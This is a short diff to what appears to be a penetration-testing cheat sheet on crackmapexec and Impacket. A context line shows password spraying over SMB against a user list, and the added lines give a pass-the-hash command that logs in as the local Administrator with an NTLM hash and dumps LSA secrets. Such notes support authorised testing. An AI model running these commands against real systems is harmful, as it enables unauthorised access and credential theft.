@@ -12,7 +12,13 @@ crackmapexec smb $RHOST -u ${USERS_FILE} -p '${PASSWORD}' -d ${DOMAIN} --continu
 Available protocols are: `ssh,mssql,winrm,smb,ldap,rdp,ftp`.
 
 
-for smb, consider following up with found credentials and `--shares`
+for smb, consider following up with found credentials and `--shares`.
+
+Also remember that you can check for reused local admin credentials with:
+
+```
+crackmapexec smb $RHOST -u Administrator -H "${NTLM_HASH}" --local-auth --lsa
+```
 
 
 ## Impacket
